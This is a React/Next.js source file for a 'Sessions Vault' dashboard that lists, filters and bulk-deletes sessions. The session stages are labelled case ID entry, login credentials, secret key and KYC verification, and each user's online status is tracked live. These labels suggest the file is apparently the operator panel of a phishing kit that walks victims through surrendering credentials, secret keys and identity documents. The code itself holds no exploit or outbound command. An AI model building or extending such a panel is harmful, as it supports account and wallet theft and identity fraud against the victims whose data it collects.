"use client"

import { useEffect, useState, useMemo } from "react"
import Link from "next/link"
import { Loader, Trash2, Search } from "lucide-react"
import { toast } from "sonner"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table"
import { Badge } from "@/components/ui/badge"
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog"
import { useSessionStore } from "@/lib/stores/sessionStore"
import type { SessionData } from "@/lib/stores/sessionStore"

const STAGES = ["case_id", "credentials", "secret_key", "kyc", "completed"]
const STATUSES = ["active", "completed", "terminated"]

const STAGE_LABELS: Record<string, string> = {
  case_id: "Case ID Entry",
  credentials: "Login Credentials",
  secret_key: "Secret Key",
  kyc: "KYC Verification",
  completed: "Completed",
}

const STATUS_COLORS: Record<string, string> = {
  active: "bg-green-500/20 text-green-400 border-green-500/30",
  completed: "bg-blue-500/20 text-blue-400 border-blue-500/30",
  terminated: "bg-red-500/20 text-red-400 border-red-500/30",
}

export default function SessionsVaultPage() {
  // Get sessions from Zustand store (auto-updates via WebSocket)
  // Select the Map directly (atomic, stable reference per Zustand v5)
  const sessionsMap = useSessionStore((state) => state.sessions)

  // Memoize array conversion to prevent infinite loops
  const sessions = useMemo(() => Array.from(sessionsMap.values()), [sessionsMap])

  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)

  // Filter states
  const [searchQuery, setSearchQuery] = useState("")
  const [statusFilter, setStatusFilter] = useState<string>("all")
  const [stageFilter, setStageFilter] = useState<string>("all")

  // Pagination
  const [currentPage, setCurrentPage] = useState(1)
  const ITEMS_PER_PAGE = 10

  // Selection and bulk operations
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
  const [showDeleteConfirm, setShowDeleteConfirm] = useState(false)
  const [isDeleting, setIsDeleting] = useState(false)

  // Fetch sessions
  useEffect(() => {
    const fetchSessions = async () => {
      try {
        setLoading(true)
        setError(null)

        const params = new URLSearchParams()
        if (searchQuery) params.append("search", searchQuery)
        if (statusFilter !== "all") params.append("status", statusFilter)
        if (stageFilter !== "all") params.append("stage", stageFilter)

        const res = await fetch(`/api/proxy/sessions?${params.toString()}`)

        if (!res.ok) {
          throw new Error("Failed to fetch sessions")
        }

        const data = await res.json()
        const sessionList = Array.isArray(data) ? data : data.results || []
        useSessionStore.getState().setSessionList(sessionList)
        setCurrentPage(1)
      } catch (err) {
        const message = err instanceof Error ? err.message : "Failed to load sessions"
        console.error("Fetch error:", message)
        setError(message)
      } finally {
        setLoading(false)
      }
    }

    const timer = setTimeout(fetchSessions, 300) // Debounce search
    return () => clearTimeout(timer)
  }, [searchQuery, statusFilter, stageFilter])


  // Pagination
  const totalPages = Math.ceil(sessions.length / ITEMS_PER_PAGE)
  const paginatedSessions = sessions.slice(
    (currentPage - 1) * ITEMS_PER_PAGE,
    currentPage * ITEMS_PER_PAGE
  )

  // Handle selection
  const toggleSelectAll = () => {
    if (selectedIds.size === paginatedSessions.length) {
      setSelectedIds(new Set())
    } else {
      setSelectedIds(new Set(paginatedSessions.map((s) => s.uuid)))
    }
  }

  const toggleSelect = (uuid: string) => {
    const newSet = new Set(selectedIds)
    if (newSet.has(uuid)) {
      newSet.delete(uuid)
    } else {
      newSet.add(uuid)
    }
    setSelectedIds(newSet)
  }

  // Bulk delete
  const handleBulkDelete = async () => {
    if (selectedIds.size === 0) return

    setIsDeleting(true)
    try {
      const res = await fetch("/api/proxy/sessions/bulk", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ uuids: Array.from(selectedIds) }),
      })

      if (!res.ok) {
        const errorData = await res.json()
        throw new Error(errorData.error || "Failed to delete sessions")
      }

      // Parse the backend response with detailed results
      const data = await res.json()

      // Show success/failure feedback to user with toast notifications
      if (data.deleted && data.deleted > 0) {
        const deletedText = `${data.deleted} session${data.deleted !== 1 ? "s" : ""}`
        if (data.failed && data.failed > 0) {
          const failedText = `${data.failed} session${data.failed !== 1 ? "s" : ""}`
          toast.warning(`Deleted ${deletedText}`, {
            description: `⚠️ ${failedText} could not be deleted (permissions issue)`,
            duration: 5000,
          })
        } else {
          toast.success(`Successfully deleted ${deletedText}`, {
            duration: 4000,
          })
        }
      } else if (data.failed && data.failed > 0) {
        const failedText = `${data.failed} attempt${data.failed !== 1 ? "s" : ""}`
        toast.error("Could not delete sessions", {
          description: `${failedText} failed (permissions issue)`,
          duration: 5000,
        })
      }

      setSelectedIds(new Set())
      setShowDeleteConfirm(false)
    } catch (err) {
      console.error("Delete error:", err)
      const message = err instanceof Error ? err.message : "Failed to delete sessions"
      toast.error("Delete operation failed", {
        description: message,
        duration: 5000,
      })
    } finally {
      setIsDeleting(false)
    }
  }

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString("en-US", {
      month: "short",
      day: "numeric",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    })
  }

  return (
    <div className="flex flex-col gap-6 max-w-6xl mx-auto">
      {/* Header */}
      <div>
        <h1 className="text-3xl font-bold tracking-tight">Sessions Vault</h1>
        <p className="text-muted-foreground mt-2">
          Manage all sessions and perform bulk operations
        </p>
      </div>

      {/* Toolbar */}
      <Card>
        <CardContent className="pt-6">
          <div className="space-y-4">
            {/* Search */}
            <div className="flex gap-2">
              <div className="flex-1 relative">
                <Search className="absolute left-3 top-3 h-4 w-4 text-muted-foreground" />
                <Input
                  placeholder="Search by Case ID or notes..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pl-10"
                />
              </div>
            </div>

            {/* Filters */}
            <div className="flex gap-2 flex-wrap">
              <Select value={statusFilter} onValueChange={setStatusFilter}>
                <SelectTrigger className="w-48">
                  <SelectValue placeholder="All Statuses" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Statuses</SelectItem>
                  {STATUSES.map((status) => (
                    <SelectItem key={status} value={status}>
                      {status.charAt(0).toUpperCase() + status.slice(1)}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>

              <Select value={stageFilter} onValueChange={setStageFilter}>
                <SelectTrigger className="w-56">
                  <SelectValue placeholder="All Stages" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Stages</SelectItem>
                  {STAGES.map((stage) => (
                    <SelectItem key={stage} value={stage}>
                      {STAGE_LABELS[stage] || stage}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>

              {/* Bulk Delete Button */}
              {selectedIds.size > 0 && (
                <Button
                  variant="destructive"
                  size="sm"
                  onClick={() => setShowDeleteConfirm(true)}
                  disabled={isDeleting}
                  className="gap-2 ml-auto"
                >
                  <Trash2 className="w-4 h-4" />
                  Delete ({selectedIds.size})
                </Button>
              )}
            </div>

            {/* Selection info */}
            {selectedIds.size > 0 && (
              <p className="text-sm text-muted-foreground">
                {selectedIds.size} session{selectedIds.size !== 1 ? "s" : ""} selected
              </p>
            )}
          </div>
        </CardContent>
      </Card>

      {/* Error state */}
      {error && (
        <Card className="border-destructive/50 bg-destructive/5">
          <CardContent className="pt-6">
            <p className="text-sm text-destructive">Error: {error}</p>
          </CardContent>
        </Card>
      )}

      {/* Table */}
      <Card>
        <CardHeader>
          <CardTitle>Sessions</CardTitle>
          <CardDescription>
            {loading ? "Loading..." : `Showing ${paginatedSessions.length} of ${sessions.length} sessions`}
          </CardDescription>
        </CardHeader>
        <CardContent>
          {loading ? (
            <div className="flex items-center justify-center py-12">
              <Loader className="w-6 h-6 animate-spin text-muted-foreground" />
            </div>
          ) : sessions.length === 0 ? (
            <div className="flex items-center justify-center py-12">
              <p className="text-muted-foreground">No sessions found</p>
            </div>
          ) : (
            <>
              <div className="border rounded-lg overflow-hidden">
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead className="w-12">
                        <Checkbox
                          checked={
                            paginatedSessions.length > 0 &&
                            selectedIds.size === paginatedSessions.length
                          }
                          onCheckedChange={toggleSelectAll}
                          aria-label="Select all sessions on this page"
                        />
                      </TableHead>
                      <TableHead>Case ID</TableHead>
                      <TableHead>Stage</TableHead>
                      <TableHead>Status</TableHead>
                      <TableHead>Created</TableHead>
                      <TableHead>Updated</TableHead>
                      <TableHead>User</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {paginatedSessions.map((session) => (
                      <TableRow key={session.uuid} className="cursor-pointer hover:bg-muted/50">
                        <TableCell onClick={(e) => e.stopPropagation()}>
                          <Checkbox
                            checked={selectedIds.has(session.uuid)}
                            onCheckedChange={() => toggleSelect(session.uuid)}
                          />
                        </TableCell>
                        <TableCell>
                          <Link
                            href={`/dashboard/sessions/${session.uuid}`}
                            className="font-medium hover:underline"
                          >
                            Case {session.external_case_id}
                          </Link>
                        </TableCell>
                        <TableCell className="text-sm">
                          {STAGE_LABELS[session.stage] || session.stage}
                        </TableCell>
                        <TableCell>
                          <Badge
                            variant="outline"
                            className={`capitalize ${STATUS_COLORS[session.status] || ""}`}
                          >
                            {session.status}
                          </Badge>
                        </TableCell>
                        <TableCell className="text-sm">{formatDate(session.created_at)}</TableCell>
                        <TableCell className="text-sm">{formatDate(session.updated_at)}</TableCell>
                        <TableCell>
                          <span className="text-sm">
                            {session.user_online ? (
                              <span className="flex items-center gap-1">
                                <span className="w-2 h-2 bg-green-500 rounded-full" />
                                Online
                              </span>
                            ) : (
                              <span className="flex items-center gap-1 text-muted-foreground">
                                <span className="w-2 h-2 bg-red-500 rounded-full" />
                                Offline
                              </span>
                            )}
                          </span>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>

              {/* Pagination */}
              {totalPages > 1 && (
                <div className="flex items-center justify-center gap-2 mt-6">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setCurrentPage((p) => Math.max(1, p - 1))}
                    disabled={currentPage === 1}
                  >
                    Previous
                  </Button>

                  {Array.from({ length: totalPages }, (_, i) => i + 1).map((page) => (
                    <Button
                      key={page}
                      variant={currentPage === page ? "default" : "outline"}
                      size="sm"
                      onClick={() => setCurrentPage(page)}
                    >
                      {page}
                    </Button>
                  ))}

                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setCurrentPage((p) => Math.min(totalPages, p + 1))}
                    disabled={currentPage === totalPages}
                  >
                    Next
                  </Button>
                </div>
              )}
            </>
          )}
        </CardContent>
      </Card>

      {/* Delete Confirmation Dialog */}
      <AlertDialog open={showDeleteConfirm} onOpenChange={setShowDeleteConfirm}>
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>Delete Sessions</AlertDialogTitle>
            <AlertDialogDescription>
              Are you sure you want to delete {selectedIds.size} session{selectedIds.size !== 1 ? "s" : ""}? This action
              cannot be undone.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <div className="flex gap-3 justify-end">
            <AlertDialogCancel disabled={isDeleting}>Cancel</AlertDialogCancel>
            <AlertDialogAction
              onClick={handleBulkDelete}
              disabled={isDeleting}
              className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
            >
              {isDeleting ? (
                <>
                  <Loader className="w-4 h-4 mr-2 animate-spin" />
                  Deleting...
                </>
              ) : (
                "Delete"
              )}
            </AlertDialogAction>
          </div>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  )
}
